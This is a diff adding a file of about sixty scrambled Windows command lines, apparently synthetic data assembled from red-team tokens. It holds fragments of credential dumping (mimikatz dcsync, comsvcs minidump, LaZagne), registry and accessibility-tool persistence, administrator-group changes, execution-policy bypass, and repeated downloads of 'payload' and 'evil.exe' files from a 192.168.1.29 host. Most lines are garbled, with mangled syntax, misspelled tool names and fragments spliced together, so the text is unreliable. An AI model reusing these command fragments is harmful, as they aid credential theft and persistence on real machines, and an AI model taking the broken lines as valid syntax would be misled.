@@ -1,0 +1,64 @@
+silentrunner.exe $ domain
+net localgroup administrators `` cor_enable_profiling '' c : cor_profiler '' 1
+new-item -path `` http : execution -r -a `` $ { user_name } , administrators '' ''
+`` cor_profiler = keylog
+quser
+rundll32.exe os ; /grant /a
+nbtstat -n
+mimikatz.exe `` kerberos : :dcsync -new : \windows\system32\at.exe /user `` $ : shadow powershell ) -c logon/logoff '' c '' \windows\system32\sethc.exe bookmarks
+set-executionpolicy -executionpolicy 'https /l % \windows\system32\comsvcs.dll , minidump http { /set /category : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+git clone computername=
+set-executionpolicy -executionpolicy bypass -scope -scope /grant -path = c : foreach-object : http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+iediagcmd.exe /out $ '' -c `` hklm\software\microsoft\windows\currentversion\runonceex\0001\depend ;
+remove-item -path = `` http '' -o `` $ : cor_profiler '' -name threadingmodel '' '' ''
+powershell -executionpolicy | bypass -command clearing '' $ autorun $ '' -c `` select * from __instancemodificationevent 'win32_perfformatteddata_perfos_system ' ] ] : :tls12
+reg add `` domain : \users\
+conhost.exe [ -list | \updater.exe ] appinit_dlls -scope localmachine
+net localgroup `` administrators '' /t cor_profiler ''
+for : powershell % :minidump c : \system\currentcontrolset\services\winsock2\parameters -name reg_dword /d `` bypass
+net localgroup administrators `` cor_profiler , cor_profiler ''
+rdrleakdiag.exe /p $ target t1547.009 \inprocserver32 file execution file copy \users\ $ wscriptshell.createshortcut hkey_local_machine\system\currentcontrolset\services\ntds = `` $ '' '' \ $ i in $ i ; -t $ consumerargs -t '' $ true
+reg.exe add `` hkey_current_user\control = nt\currentversion\winlogon\notify\atomicredteam '' /f
+copy `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+conhost.exe create `` http : set-wmiinstance -namespace new-object hklm\security\policy\secrets \\ $ { volumn name = http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+dir '' w32time
+net localgroup `` administrators '' '' '' cor_profiler from disable-gpu-sandbox
+ffuf -w } -t $ { binary } in $ { target volumn name you ( new-object components\atomic_test ; you consumer = set-wmiinstance -namespace set-wmiinstance /grant minidump http http : //192.168.1.29:9000/payload/evil.exe file copy \users\ } -t $ shell.createshortcut hklm\software\microsoft\windows //raw.githubusercontent.com/s3cur3th1ssh1t -verbose
+quser
+cscript $ shortcut = `` $ `` hklm\system\currentcontrolset\control\session t1547.009 -arguments $ filterargs
+ffuf -w 5
+winrar a /domain
+iediagcmd.exe /out '' $ { processor ''
+python make_image.py $ { netstat
+net localgroup administrators '' /f
+namp -sn = `` windir t1547.009 service account username '' /f
+namp -sn -l $ target '' t1547.009 nt\currentversion\windows '' file '' -name `` http '' '' , cor_profiler '' $ '' inputprovider '' '' '' -name `` bypass ''
+reg add `` hklm\system\currentcontrolset\control\session nt\currentversion\image file file copy \programdata\microsoft\windows\start components\atomic_test '' -name `` keylog
+quser
+$ consumerargs = @ `` $ i = cor_profiler = threadingmodel ;
+hydra -l $ ( domain = `` domain admins = `` threadingmodel c cor_profiler '' ''
+net localgroup `` administrators '' '' '' file -name `` cor_profiler '' ' '' ''
+namp -sn $ target t1547.009 t1547.009 . $ cor_profiler = inputprovider '' '' /t set-service
+iediagcmd.exe /out '' $ `` host $ { output_zip_name } in $ { domain }
+rundll32.exe c : \windows\system32\at.exe $ : domain admins '' $ `` cor_profiler = reg_dword /d 1
+rundll32 popcalc.dll , keylog
+net localgroup `` administrators '' /f
+rdrleakdiag.exe /p administrator domain admins '' $ target t1547.009 tracking administrators
+net localgroup administrators `` cor_profiler '' /f
+dir -c `` .\lazagne .. exe all
+lazagne.exe windows
+iediagcmd.exe /out $ '' -c `` `` cor_profiler '' '' -name `` threadingmodel $ { registry_name '' '' /f
+rdrleakdiag.exe /p kerberoast windir % \microsoft\teams\current\teams.exe
+net localgroup bypass
+nmap -o $ `` domain admins '' /t both ''
+reg add `` '' c : cor_profiler = cor_profiler /grant administrators administrators '' '' , cor_profiler ''
+rdrleakdiag.exe /p /o `` $ `` '' t1547.009 \programdata\microsoft\windows\start archive_file.py $ : domain } -t $ { filename_regex }
+reg delete = $ `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /d inputprovider '' '' ''
+copy powershell -member administrators '' /domain
+net localgroup administrators `` hklm\system\currentcontrolset\control\session '' \programdata\microsoft\windows\start packages '' /f
+namp -sn -l $ filterargs
+vsiisexelauncher.exe -p $ { \system32\osk.exe
+rdrleakdiag.exe -sn $ `` hkey_local_machine\software\microsoft\windows t1547.009 ; all
+nbtstat -n
+copy powershell @ `` :list \system32\osk.exe /grant administrators '' -name `` '' '' /v cor_profiler '' = threadingmodel ''
+nmap -o -name `` cor_profiler '' -name $ : /v inputprovider '' '' '' '' ''
